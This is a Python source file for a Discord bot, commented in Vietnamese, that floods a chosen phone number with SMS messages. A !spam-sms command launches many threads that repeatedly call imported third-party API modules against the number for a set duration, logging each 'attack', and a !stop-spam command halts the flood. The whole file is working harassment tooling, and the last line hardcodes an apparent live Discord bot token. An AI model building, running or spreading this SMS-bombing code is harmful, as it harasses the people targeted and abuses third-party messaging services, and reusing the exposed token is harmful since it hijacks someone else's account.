import os
import importlib
import threading
import discord
from discord.ext import commands
import time
import asyncio

# Khởi tạo bot với prefix "!"
bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

# Load các module API từ thư mục api_call
fin = os.listdir("api_call")
fout = []

for i in fin:
    if "__" in i:
        continue
    fout.append(i.replace(".py", ""))

modules = {name: importlib.import_module(f"api_call.{name}") for name in fout}

# Dictionary để lưu trạng thái spam và thread
spam_threads = {}
lock = threading.Lock()

# Hàm gọi API
def call_api(mod, sdt):
    try:
        resp = modules[mod].call(sdt)
        if resp.status_code == 200:
            print(f"Attack {mod} successfully on phone number | {sdt}!")
        else:
            print(f"Attack {mod} failed!")
    except Exception as e:
        with open("logcall.log", "a") as f:
            f.write(f"Error with api {mod}: {e}\n")

# Sự kiện khi bot sẵn sàng
@bot.event
async def on_ready():
    print(f"Bot đã sẵn sàng với tên {bot.user}")

# Hàm cleanup thread chạy trong background
def cleanup_threads(sdt, active_threads):
    for thread in active_threads:
        thread.join(timeout=1.0)  # Chờ thread con hoàn tất
    with lock:
        if sdt in spam_threads:
            del spam_threads[sdt]
    # Xóa terminal và hiển thị thông báo
    os.system("cls" if os.name == "nt" else "clear")
    print(f"Đã dừng spam số {sdt}.")

# Lệnh !spam-sms
@bot.command()
async def spam_sms(ctx, sdt: str = None, duration: int = None):
    if sdt is None:
        embed = discord.Embed(
            title="Lỗi",
            description="Vui lòng cung cấp số điện thoại!\nVí dụ: `!spam-sms 0123456789 30`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Kiểm tra độ dài số điện thoại
    if len(sdt) < 10:
        embed = discord.Embed(
            title="Lỗi",
            description="Số điện thoại phải có ít nhất 10 số!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    elif len(sdt) > 10:
        embed = discord.Embed(
            title="Lỗi",
            description="Số điện thoại không được dài hơn 10 số!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    if duration is None:
        embed = discord.Embed(
            title="Lỗi",
            description="Vui lòng cung cấp thời gian spam (giây)!\nVí dụ: `!spam-sms 0123456789 30`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    if duration <= 0:
        embed = discord.Embed(
            title="Lỗi",
            description="Thời gian phải lớn hơn 0 giây!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return

    with lock:
        if sdt in spam_threads:
            embed = discord.Embed(
                title="Lỗi",
                description=f"Số `{sdt}` đang được spam! Dùng `!stop-spam {sdt}` để dừng.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return
        
        # Tạo event và danh sách thread con
        stop_event = threading.Event()
        active_threads = []
        spam_threads[sdt] = (stop_event, active_threads)

    # Embed khi bắt đầu spam
    embed = discord.Embed(
        title="Spam SMS",
        description=f"Bắt đầu spam SMS tới số `{sdt}` trong {duration} giây...",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

    # Hàm chạy spam trong thread
    def spam_loop():
        start_time = time.time()
        while time.time() - start_time < duration and not stop_event.is_set():
            for mod in fout:
                if stop_event.is_set():
                    break
                thread = threading.Thread(target=call_api, args=(mod, sdt))
                with lock:
                    active_threads.append(thread)
                thread.start()
        
        # Chạy cleanup trong thread riêng để không chặn luồng chính
        cleanup_thread = threading.Thread(target=cleanup_threads, args=(sdt, active_threads))
        cleanup_thread.daemon = True
        cleanup_thread.start()

    # Chạy spam trong một thread riêng
    spam_thread = threading.Thread(target=spam_loop)
    spam_thread.daemon = True
    spam_thread.start()

    # Chờ thời gian kết thúc và gửi thông báo
    await asyncio.sleep(duration)
    with lock:
        if sdt not in spam_threads:  # Nếu đã dừng thủ công
            return
        stop_event, active_threads = spam_threads[sdt]
        stop_event.set()  # Đặt cờ dừng
    embed = discord.Embed(
        title="Hoàn tất",
        description=f"Đã dừng spam SMS tới số `{sdt}` sau {duration} giây!",
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed)

# Lệnh !stop-spam
@bot.command()
async def stop_spam(ctx, sdt: str = None):
    if sdt is None:
        embed = discord.Embed(
            title="Lỗi",
            description="Vui lòng cung cấp số điện thoại!\nVí dụ: `!stop-spam 0123456789`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    with lock:
        if sdt not in spam_threads:
            embed = discord.Embed(
                title="Lỗi",
                description=f"Số `{sdt}` hiện không được spam!",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return
        stop_event, active_threads = spam_threads[sdt]
        stop_event.set()  # Đặt cờ dừng
    
    embed = discord.Embed(
        title="Đã dừng",
        description=f"Đã dừng spam SMS tới số `{sdt}`!",
        color=discord.Color.orange()
    )
    await ctx.send(embed=embed)

# Chạy bot với token của bạn
bot.run("MTM1NTA0MDEzODg4NzE3MjE5Nw.GJjGXA.JdCDf3180Kz-uo3C3R9qYLllvXs0BGsl1vAuVs")